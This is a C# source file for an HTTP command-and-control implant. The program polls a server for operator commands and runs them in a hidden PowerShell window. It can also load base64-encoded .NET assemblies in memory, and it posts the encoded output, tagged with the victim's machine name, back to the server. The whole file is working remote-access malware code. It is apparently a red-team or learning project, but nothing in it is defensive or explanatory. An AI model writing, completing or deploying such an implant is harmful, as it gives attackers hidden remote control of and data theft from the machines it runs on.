using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using HTTPImplant.Modules;

namespace HTTPImplant
{
    public class Implant
    {
        public string host { get; set; }
        public string port { get; set; }

        public static void Main(string[] args)
        {
            string implantId = Environment.MachineName;
            var webClient = new WebClient();
            webClient.DownloadStringCompleted += (sender, e) =>
            {
                if (e.Error == null)
                {
                    string jsonResponse = e.Result;
                    // Manually parsing the JSON.
                    Command command = new Command();
                    command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                    command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                    command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                    command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                    command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\"}" }, StringSplitOptions.None)[1];
                    command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\"}" }, StringSplitOptions.None)[1];

                    // Decision based on Input
                    if (command.Input.Contains("os"))
                    {
                        ProcessStartInfo processStartInfo = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            RedirectStandardInput = true,
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process process = new Process
                        {
                            StartInfo = processStartInfo
                        };
                        process.Start();
                        var sw = process.StandardInput;
                        var sr = process.StandardOutput;
                        sw.WriteLine(command.Input);
                        sw.WriteLine("exit");
                        string output = sr.ReadToEnd();
                        process.WaitForExit();
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                    else if (command.Input.Contains("execute-assembly"))
                    {
                        byte[] bytes = Convert.FromBase64String(command.File);
                        string output = ExecuteAssembly.Execute(bytes);
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                }
                else
                {
                   
                }
            };
            webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));

            // To keep the console running, so it doesn't close before the async tasks complete
            Console.ReadLine();
        }

        public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
        {
            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            Console.WriteLine(resultJson);
            webClient.UploadStringCompleted += (sender2, e2) =>
            {
            };
            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", resultJson);
        }

    }

    public class Command
    {
        public string Input { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
    }
}
